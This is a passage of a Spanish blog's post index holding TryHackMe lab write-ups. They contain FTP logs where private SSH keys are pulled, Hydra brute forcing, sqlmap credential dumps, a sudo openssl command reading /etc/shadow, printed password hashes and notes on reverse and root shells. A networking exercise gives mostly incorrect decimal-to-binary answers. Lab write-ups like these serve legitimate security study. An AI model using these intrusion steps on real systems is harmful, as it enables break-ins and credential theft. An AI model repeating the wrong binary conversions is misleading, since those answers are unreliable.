-lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-x--- 4 ftp ftp 4096 Jul 10 22:39 . drwxr-x--- 4 ftp ftp 4096 Jul 10 22:39 .. lrwxrwxrwx 1 ftp ftp 9 Apr 30 01:33 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ftp ftp 220 Apr 29 03:58 .bash_logout -rw-r--r-- 1 ftp ftp 3771 Apr 29 03:58 .bashrc drwx------ 2 ftp ftp 4096 Jul 10 22:16 .cache -r-------- 1 ftp ftp 38 Apr 30 04:44 .flag drwx------ 3 ftp ftp 4096 Jul 10 22:16 .gnupg -rw-r--r-- 1 ftp ftp 807 Apr 29 03:58 .profile 226 Directory send OK. GCRAWFORD - FTP/HYDRA Utilizamos nuevamente HYDRA pero esta vez con el usuario gcrawford en donde logramos obtener una contraseña para el servicio FTP.\nIngresamos al servicio y encontramos la clave privada y publica SSH de este usuario, además encontramos un archivo de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 root@upset:~/thm/kothhacker# ftp kothhacker.thm Connected to kothhacker.thm. 220-Ellingson Mineral Company FTP Server 220- 220-WARNING 220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986 220 Name (kothhacker.thm:root): gcrawford 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-x--- 6 ftp ftp 4096 Apr 30 04:25 . drwxr-x--- 6 ftp ftp 4096 Apr 30 04:25 .. lrwxrwxrwx 1 ftp ftp 9 Apr 30 01:31 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ftp ftp 220 Apr 29 04:00 .bash_logout -rw-r--r-- 1 ftp ftp 3771 Apr 29 04:00 .bashrc drwx------ 2 ftp ftp 4096 Apr 29 17:05 .cache drwx------ 3 ftp ftp 4096 Apr 29 17:05 .gnupg drwxrwxr-x 3 ftp ftp 4096 Apr 29 20:53 .local -rw-r--r-- 1 ftp ftp 807 Apr 29 04:00 .profile drwx------ 2 ftp ftp 4096 Jul 10 21:07 .ssh -r-------- 1 ftp ftp 252 Apr 30 04:25 business.txt 226 Directory send OK. ftp\u0026gt; cd .ssh 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 398 Jul 10 21:07 authorized_keys -rw------- 1 ftp ftp 1766 Jul 10 21:07 id_rsa -rw-r--r-- 1 ftp ftp 398 Jul 10 21:07 id_rsa.pub 226 Directory send OK. ftp\u0026gt; get id_rsa local: id_rsa remote: id_rsa 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for id_rsa (1766 bytes). 226 Transfer complete. 1766 bytes received in 0.00 secs (2.2396 MB/s) ftp\u0026gt; cd .. 250 Directory successfully changed. ftp\u0026gt; get business.txt local: business.txt remote: business.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for business.txt (252 bytes). 226 Transfer complete. 252 bytes received in 0.00 secs (1.7935 MB/s) ftp\u0026gt; exit 221 Goodbye. El archivo de texto contiene una flag.\nIntentamos autenticarnos con el archivo id_rsa en el servicio SSH pero al parecer el archivo esta protegido por una frase.\n1 2 3 4 5 6 7 root@upset:~/thm/kothhacker# ssh gcrawford@kothhacker.thm -i id_rsa Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Enter passphrase for key \u0026#39;id_rsa\u0026#39;: gcrawford@kothhacker.thm: Permission denied (publickey). root@upset:~/thm/kothhacker# Utilizamos ssh2john para obtener el hash del archivo -id_rsa- y crackeamos el hash con john.\nLogramos obtener la frase y logramos obtener una shell con el usuario gcrawford.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando nano con el archivo bussines.txt. Utilizamos nano para obtener una shell root.\nLogramos obtener una flag en /root/.\nAgregamos nuestra clave publica al archivò authorized_keys e ingresamos con el usuario root en el servicio ssh.\nBuscamos la flag en el directorio /home y logramos encontrar las dos ultimas en /home/tryhackme/.flag y /home/production/.flag.\nPLAGUE - API/HYDRA En una de las paginas principales y en robots.txt encontramos un comentario que hacen enfasis en plague. Utilizamos Hydra y en donde el parametro usuario utilizamos plage.\nUtilizamos Hydra para intentar logearnos en /backdoor/shell, logramos encontrar la contraseña para plague.\nLogramos autenticarnos y ejecutar comandos.\nYa que podemos ejecutar comandos vamos a obtener una shell inversa.\nHacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando openssl. Utilizamos GTFOBINS para leer el archivo /etc/shadow.\n1 2 LFILE=/etc/shadow /usr/bin/sudo /usr/bin/openssl enc -in \u0026#34;$LFILE\u0026#34; Logramos obtener el contenido, las contraseñas encriptadas.\n1 2 3 4 5 tryhackme:$6$m6t6Wwb.Irn8qFzm$LJ8sBnQX6.XDyqjQuL0XVoVSOXyRlcugWjbp3cN80Xl9344moBmQ/XdQfO2w5Oub4Kz0eBFG4KeP..05hFh171:18378:0:99999:7::: production:$6$CMJF8CIY$aq3ycncJkhhTa6h6vgec5Dr53cKJmQ.9Fa.7ZceaolrIr0B5DDKHZfV97GI0puAfrD.hCt0ZOBqtbt/RT/1TV.:18381:0:99999:7::: ftp:*:18381:0:99999:7::: rcampbell:$6$OlVRVXBb$5toooBVqa93gBtUncQNyMHeKvMdy.Wtr9eukllbmOv7wd8X.LaQR/tTYK9D1BCFSVGI3Pr/dD4U08d/8wNwES1:18453:0:99999:7::: gcrawford:$6$PujyDO0o$/TQMT0PNSCO.1qavpm26sCu9TAt.OTvjhQrXYVY5S.MNUg6XE0pxHnB3lRqfZEYo1Vjvyo8TY6CTE3FH/vzXL1:18453:0:99999:7::: ","description":"KoTH Hackers es una maquina de TryHackMe parte de las maquinas de King of the Hill se presentan algunas formas para obtener acceso y escalar privilegios.","id":124,"section":"posts","tags":[],"title":"TryHackMe - KoTH Hackers","uri":"https://sckull.github.io/posts/kothhacker/"},{"content":"\ruopeasy es una maquina de TryHackMe, encontramos una vulnerabilidad SQL Injection donde obtuvimos credenciales para acceder a WordPress que luego nos dio acceso a la maquina. Escalamos privilegios con contraseñas almacenadas.\nRoom Titulo uopeasy Descripción * Puntos * Dificultad Media Maker ben NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # Nmap 7.80 scan initiated Mon Jul 6 22:53:12 2020 as: nmap -sV -o nmap_scan_mini uopeasy.thm Nmap scan report for uopeasy.thm (10.10.106.78) Host is up (0.16s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 443/tcp open ssl/ssl Apache httpd (SSL-only mode) 8080/tcp open http Apache httpd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 6 22:53:55 2020 -- 1 IP address (1 host up) scanned in 43.52 seconds # Nmap 7.80 scan initiated Mon Jul 6 22:53:19 2020 as: nmap -sV -p- -T5 -o nmap_scan uopeasy.thm Warning: 10.10.106.78 giving up on port because retransmission cap hit (2). Nmap scan report for uopeasy.thm (10.10.106.78) Host is up (0.18s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 443/tcp open ssl/ssl Apache httpd (SSL-only mode) 8080/tcp open http Apache httpd 11930/tcp filtered unknown 48235/tcp filtered unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 6 22:57:59 2020 -- 1 IP address (1 host up) scanned in 279.92 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 root@upset:~/thm/uopeasy# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://uopeasy.thm/ -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /login.php (Status: 200) /phpmyadmin (Status: 301) /server-status (Status: 403) HTTPS Encontramos una pagina web en el puerto 443 con una url que redirecciona a wordpress. La pagina que aparece en este puerto es la misma que la del puerto 8080.\nUtilizamos gobuster nuevamente para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 root@upset:~/thm/uopeasy# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://uopeasy.thm/ -q -t 25 -x php,html,txt -k /cgi-bin/.html (Status: 403) /favicon.ico (Status: 200) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /wordpress (Status: 301) SQLi SQLMAP Capturamos los datos en la pagina /login.php con burpsuite y utilizamos sqlmap para verificar si podemos realizar inyeccion sql.\nLobramos obtener las bases de datos y al parecer utiliza una base de datos MySQL.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 available databases [7]: [*] information_schema [*] login [*] mysql [*] performance_schema [*] phpmyadmin [*] users [*] wordpress8080 Database: login Table: users [2 entries] +----------+-----------+ | password | user_name | +----------+-----------+ | password | candyshop | | PopRocks | Sir | +----------+-----------+ Database: wordpress8080 Table: users [1 entry] +----------+---------------------+ | username | password | +----------+---------------------+ | admin | S[... snip ... ]d | +----------+---------------------+ DAEMON - USER Utilizamos las credenciales de la base de datos ingresar en wordpress.\nEditamos el archivo 404.php para agregar una shell inversa.\nLogramos obtener una shell con el usuario Deamon.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion de archivos, y en el archivo login.php encontramos nuevamente una contraseña, utilizamos esta con el usuario root y logramos obtener una shell con root.\nLas mismas credenciales para root nos permiten ingresar a phpmyadmin.\n","description":"uopeasy es una maquina de TryHackMe, encontramos una vulnerabilidad SQL Injection donde obtuvimos credenciales para acceder a WordPress que luego nos dio acceso a la maquina. Escalamos privilegios con contraseñas almacenadas.","id":125,"section":"posts","tags":["sqli","sqlmap","wordpress"],"title":"TryHackMe - uopeasy","uri":"https://sckull.github.io/posts/uopeasy/"},{"content":"\rBP: Networking de TryHackMe es una serie de conceptos y ejercicios sobre redes.\nRoom Titulo Networking Descripción Learn the basics of networking and network addressing Puntos 1440 Dificultad Facil Maker DarkStar7471 Kinda like a street address, just cooler. Todas las computadoras tienen una direccion ip. Aca se definen los diferentes tipos de direcciones IP.\nClases de direcciones IP\nClase Rango Clase A 1-127 Clase B 128-191 Clase C 192-223 Clase D 224-239 Clase E 240-255 Espacio de direcciones privadas\nClase Rango Clase A 10.0.0.0 Clase B 172.16.0.0 a 172.31.255.255 Clase C 192.168.0.0 a 192.168.255.255 SPOILER WARNING\rRESPUESTAS - SPOILER WARNING\rHow many categories of IPv4 addresses are there?\n5 - Existen 5 clases de direcciones IP\n*Which type is for research? Looking for a letter rather than a number here\nE - Esta clase IP está reservado para fines experimentales sólo para R\u0026amp;D o estudio.\nHow many private address ranges are there?\n3 - Existen 3 clases de direcciones IP Privadas\nWhich private range is typically used by businesses?\nA - Clase privada\nThere are two common default private ranges for home routers, what is the first one?\n192.168.0.0 - Comunmente utilizada para routers de casa.\nHow about the second common private home range?\n192.168.1.0- Comunmente utilizada para routers de casa.\nHow many addresses make up a typical class C range? Specifically a /24\n256 - 254 + 2 (reservadas)\nOf these addresses two are reserved, what is the first addresses typically reserved as?\nnetwork\nThe very last address in a range is typically reserved as what address type?\nbroadcast - **172.31.255.255 Ejemplo **\nA third predominant address type is typically reserved for the router, what is the name of this address type?\ngateway - gateway\nWhich address is reserved for testing on individual computers?\n127.0.0.1 - localhost\nA particularly unique address is reserved for unroutable packets, what is that address? This can also refer to all IPv4 addresses on the local machine.\n0.0.0.0 - 0.0.0.0\nBinary to Decimal En esta parte debemos de realizar la conversion de binario a Decimal, para hacer esto utilizamos la siguiente tabla:\n128 64 32 16 8 4 2 1 Para poder convertir de binario a decimal (utilizando la tabla) ordenamos los numeros (0\u0026rsquo;s y 1\u0026rsquo;s) de tal forma que queden ordenados con los valores de arriba. Si el numero es 1 tomamos el numero, si es 0, no.\n128 64 32 16 8 4 2 1 1 0 0 1 0 0 1 0 Si el numero es 1 tomamos el numero, si es 0, no.\nNumeros Guia 128 64 32 16 8 4 2 1 Binario 1 0 0 1 0 0 1 0 Decimal 128 0 0 16 0 0 2 0 Ahora que tenemos los numeros, sumamos todos (no es necesario tomar los 0\u0026rsquo;s) y obtenemos el resultado:\n128+0+0+16+0+0+2+0 = 146 Realizamos lo mismo para todos los numeros.\nSPOILER WARNING\rRESPUESTAS - SPOILER WARNING\r1001 0010 = 128+16+2 = 146\r0111 0111 = 64+32+16+4+2+1 = 119\r1111 1111 = 128+64+32+16+8+4+2+1 = 255\r1100 0101 = 128+64+4+1 = 197\r1111 0110 = 128+64+32+16+4+2 = 246\r0001 0011 = 16+2+1 = 19\r1000 0001 = 128+1 = 129\r0011 0001 = 32+16+1 = 49\r0111 1000 = 64+32+16+8 = 120\r1111 0000 = 128+64+32+16 = 240\r0011 1011 = 32+16+8+2+1 = 59\r0000 0111 = 4+2+1 = 7 Decimal to Binary Para convertir de decimal a Binario, tomamos el numero y lo dividimos dentro de 2, hasta llegar a su minima expresion (0). Si el resultado o numero es par entonces colocamos 0 si es impar 1. El primer número quedaria de la siguiente forma:\n238 = 238 -----\u0026gt; 0\r238 / 2 = 119 -----\u0026gt; 1\r119 / 2 = 59 -----\u0026gt; 1\r59 / 2 = 29 -----\u0026gt; 1\r29 / 2 = 14 -----\u0026gt; 0\r14 / 2 = 7 -----\u0026gt; 1\r7 / 2 = 3 -----\u0026gt; 1\r3 / 2 = 1 -----\u0026gt; 1 El resultado se lee de abajo hacia arriba: 1110 1110.\nRealizamos lo mismo para todos los numeros.\nSPOILER WARNING\rRESPUESTAS - SPOILER WARNING\r1 2 3 4 5 6 7 8 9 10 11 34 = 0100 1000 123 = 0111 1011 50 = 0011 0010 255 = 01111 1111 200 = 0110 0100 10 = 0101 0000 138 = 0100 0101 1 = 0000 0001 13 = 0000 1101 250 = 0111 1101 114 = 0111 0010 Address Class Identification En esta seccion se necesita identificar a la clase que pertenece la IP dada utilizando la tabla.\nClases de direcciones IP\nClase Rango Clase A 1-127 Clase B 128-191 Clase C 192-223 Clase D 224-239 Clase E 240-255 Espacio de direcciones privadas\nClase Rango Clase A 10.0.0.0 Clase B 172.16.0.0 a 172.31.255.255 Clase C 192.168.0.0 a 192.168.255.255 SPOILER WARNING\rRESPUESTAS - SPOILER WARNING\r1 2 3 4 5 6 7 8 9 10 11 12 10.240.1.1 = A 150.10.15.0 = B 192.14.2.0 = C 148.17.9.1 = B 193.42.1.1 = C 126.8.156.0 = A 220.200.23.1 = C 230.230.45.58 = D 177.100.18.4 = B 119.18.45.0 = A 117.89.56.45 = A 215.45.45.0 = C Obtener respuestas de Forma Facil\nLinks de ayuda\nDirección IP\nIPv4 - Direcciones Reservadas\ncommon router default DHCP IP address ranges?\n","description":"BP: Networking de TryHackMe es una serie de conceptos y ejercicios sobre redes.","id":126,"section":"posts","tags":[],"title":"TryHackMe - BP: Networking","uri":"https://sckull.github.io/posts/bpnetworking/"},{"content":"\rYear of the Rabbit es una maquina de TryHackMe, la maquina nos proporciona un wordlist que encontramos en una imagen y utilizamos en FTP para realizar un ataque de fuerza bruta con Hydra, tras acceder encontramos un pequeño que nos proporciono credenciales para acceder por SSH. Cambiamos de usuario con contraseñas almacenadas. Escalamos privilegios con una vulnerabilidad en Sudo y con Vi.\nRoom Titulo Year of the Rabbit Descripción Time to enter the warren\u0026hellip; Puntos 310 Dificultad Facil Maker MuirlandOracle NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # Nmap 7.80 scan initiated Sun Jun 28 21:19:18 2020 as: nmap -sV -o nmap_scan_mini rabbit.thm Nmap scan report for rabbit.thm (10.10.93.147) Host is up (0.22s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) 80/tcp open http Apache httpd 2.4.10 ((Debian)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 28 21:19:55 2020 -- 1 IP address (1 host up) scanned in 36.98 seconds # Nmap 7.80 scan initiated Sun Jun 28 21:19:17 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan rabbit.thm Nmap scan report for rabbit.thm (10.10.93.147) Host is up (0.17s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) |_ 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 28 21:35:05 2020 -- 1 IP address (1 host up) scanned in 947.91 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 root@upset:~/thm/yearoftherabbit# gobuster dir -u http://rabbit.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) En el directorio assets encontramos dos archivos, un archivo mp4 y una hoja de estilos (CSS).\nEn la hoja de estilos encontramos una direccion hacia una pagina.\nAl visitar la pagina nos redirige hacia un video de youtube, desactivamos javascript en nuestro navegador y vemos un video incrustado en la pagina, es el mismo que se encuentra en /assets/.\nUtilizamos BurpSuite y encontramos que realiza una peticion a una pagina con un parametro de un directorio.\nIntentamos realizar detectar alguna vulnerabilidad en esta pagina y su parametro pero no encontramos alguno. Ya que indica un directorio, utilizamos este en la pagina y encontramos una imagen.webp.\nFTP - USER Descargamos la imagen y revisamos las strings dentro de esta, encontramos un mensaje con una lista de posibles contraseñas de un usuario en el servicio ftp.\nUtilizamos HYDRA con el usuario y wordlist encontrado en el servicio ftp y logramos encontrar las credenciales.\nDentro, encontramos un archivo txt. Que al revisarlo encontramos que esta en el lenguaje brainfuck.\nUSER - ELI Utilizamos un dcode.fr para obtener en texto plano el mensaje, en donde encontramos unas credenciales.\nUtilizamos las credenciales en el servicio SSH y obtenemos una shell.\nUSER - GWENDOLINE Al entrar a este servicio nos muestra un mensaje de root para Gwendoline.\nBuscamos el lugar \u0026ldquo;s3cr3t\u0026rdquo; y encontramos un archivo donde está la contraseña de Gwendoline.\nUtilizamos la contraseña para elevar a Gwendoline y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando vi en el archivo user.txt.\nIntentamos utilizar el comando con sudo pero no nos permitió.\nVerificamos la version de sudo, buscamos un exploit/vulnerabilidad relacionado y vemos sudo 1.8.27 - Security Bypass, intentamos utilizar este \u0026ldquo;exploit\u0026rdquo;, logramos ejecutar vi con sudo, obtener una shell root utilizando :!sh en vi y nuestra flag root.txt.\n","description":"Year of the Rabbit es una maquina de TryHackMe, la maquina nos proporciona un wordlist que encontramos en una imagen y utilizamos en FTP para realizar un ataque de fuerza bruta con Hydra, tras acceder encontramos un pequeño que nos proporciono credenciales para acceder por SSH. Cambiamos de usuario con contraseñas almacenadas. Escalamos privilegios con una vulnerabilidad en Sudo y con Vi.","id":127,"section":"posts","tags":["ftp","brainfuck","vim","sudo privesc"],"title":"TryHackMe - Year of the Rabbit","uri":"https://sckull.github.io/posts/yearoftherabbit/"},{"content":"\rBreak Out The Cage es una maquina de TryHackMe, presenta retos para obtener credenciales y acceso a la maquina, para el movimiento lateral analizamos un script y modificamos un archivo dependiente. Un reto nos permitió obtener la contraseña del usuario root.\nRoom Titulo Break Out The Cage Descripción Help Cage bring back his acting career and investigate the nefarious goings on of his agent! Puntos 240 Dificultad Facil Maker Magna NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 # Nmap 7.80 scan initiated Sat Jun 27 22:24:17 2020 as: nmap -sV -o nmap_scan_mini breakthecage.thm Nmap scan report for breakthecage.thm (10.10.15.25) Host is up (0.16s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 22:25:00 2020 -- 1 IP address (1 host up) scanned in 43.71 seconds # Nmap 7.80 scan initiated Sat Jun 27 22:24:15 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan breakthecage.thm Nmap scan report for breakthecage.thm (10.10.15.25) Host is up (0.15s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 396 May 25 23:33 dad_tasks | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.6.160 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA) | 256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA) |_ 256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Nicholas Cage Stories Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 22:50:38 2020 -- 1 IP address (1 host up) scanned in 1582.44 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 root@upset:~/thm/breakoutthecage# gobuster dir -u http://breakthecage.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 125 -x php,html,txt /images (Status: 301) /html (Status: 301) /scripts (Status: 301) /index.html (Status: 200) /contracts (Status: 301) /auditions (Status: 301) Encontramos un directorio en donde hay un archivo mp3.\nUtilizamos Sonic Visualiser para verificar que el archivo no tenga algo dentro agregando una capa de espectrograma. Logramos ver una palabra que seguramente nos servira. Puede que alguna de las letras sea engañosa, audacity tambien trae la opcion de agregar una capa de espectrograma.\nFTP - Task 1 Nos conectamos al servicio FTP con las credenciales de anonymous:anonymous y encontramos un archivo que esta codificado en base64.\nUtilizamos CyberChef para decodificar el mensaje, al realizar esto vemos el mensaje \u0026ldquo;descompuesto\u0026rdquo;. Utilizamos Vigenere Cipher con la palabra que encontramos para obtener el mensaje real. Task 1\nUSER - WESTON -\u0026gt; CAGE Ahora que encontramos la contraseña de weston iniciamos sesion en el servicio ssh. Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando /usr/bin/bees. El archivo contiene un comando, pero este no puede ser editado por el usuario actual.\nUtilizamos pspy64 para ver si existe algun cronjob en la maquina, esto porque durante la enumeracion de los archivos se imprimia un mensaje diferente en pantalla.\nEncontramos un archivo que se ejecuta y se encuentra en el directorio /opt/.\nEl codigo del script en python lee el archivo .quotes en el que hay una larga lista de frases, elige una aleatoria, la imprime mediante el comando wall.\nPara poder tomar ventaja de este script deberia de quedar de la siguiente forma para poder ejecutar comandos y una posible shell inversa.\nRenombramos el archivo .quotes, creamos uno nuevo con una frase y nuestra shell inversa.\nPonemos a la escucha netcat en nuestra maquina, esperamos, y logramos obtener una shell con el usuario cage.\nY nuestra flag user.txt.\nPRIVILEGE ESCALATION En la carpeta principal de cage encontramos el archivo id_rsa que nos da acceso a una shell en el servicio ssh. En la carpeta email_backup encontramos varios correos en tres archivos. En uno de ellos hablan sobre una nota y lo que esta decia.\nIntentamos utilizarla como contraseña del usuario root pero no funcionó, por lo que utilizamos nuevamente vignere cipher pero esta vez no teniamos la clave y utilizamos dcode.fr ya que nos muestra una lista de posibles claves y su resultado. Logramos encontrar su clave y el mensaje real.\nUtilizamos el mensaje real como contraseña del usuario root y logramos obtener acceso con este usuario, además encontramos nuevamente un backup de correos en su carpeta principal y en uno de ellos nuestra flag *root.txt.\n","description":"Break Out The Cage es una maquina de TryHackMe, presenta retos para obtener credenciales y acceso a la maquina, para el movimiento lateral analizamos un script y modificamos un archivo dependiente. Un reto nos permitió obtener la contraseña del usuario root.","id":128,"section":"posts","tags":["ftp","steganography","vigenere"],"title":"TryHackMe - Break Out The Cage","uri":"https://sckull.github.io/posts/breakthecage/"},{"content":"\rLian_Yu es una maquina de TryHackMe, la enumeracion permitió obtener credenciales para FTP donde encontramos un reto de Esteganografia que nos dio acceso. finalmente obtuvimos una shell root con pkexec.\nRoom Titulo Lian_Yu Descripción A beginner level security challenge Puntos 180 Dificultad Facil Maker Deamon NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), 80 (http) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 # Nmap 7.80 scan initiated Sat Jun 27 01:14:57 2020 as: nmap -sV -o nmap_scan_mini lianyu.thm Nmap scan report for lianyu.thm (10.10.79.149) Host is up (0.15s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) 80/tcp open http Apache httpd 111/tcp open rpcbind 2-4 (RPC #100000) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 01:15:31 2020 -- 1 IP address (1 host up) scanned in 33.78 seconds # Nmap 7.80 scan initiated Sat Jun 27 01:15:08 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan lianyu.thm Warning: 10.10.79.149 giving up on port because retransmission cap hit (6). Nmap scan report for lianyu.thm (10.10.79.149) Host is up (0.15s latency). Not shown: 65517 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) | ssh-hostkey: | 1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA) | 2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA) | 256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA) |_ 256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Purgatory 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 35854/udp6 status | 100024 1 39587/tcp6 status | 100024 1 40288/udp status |_ 100024 1 47359/tcp status 7573/tcp filtered unknown 8324/tcp filtered unknown 12786/tcp filtered unknown 14426/tcp filtered unknown 18334/tcp filtered unknown 24024/tcp filtered unknown 27137/tcp filtered unknown 37836/tcp filtered unknown 40619/tcp filtered unknown 47359/tcp open status 1 (RPC #100024) 49276/tcp filtered unknown 54432/tcp filtered unknown 56048/tcp filtered unknown 60898/tcp filtered unknown Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 01:41:23 2020 -- 1 IP address (1 host up) scanned in 1574.59 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para 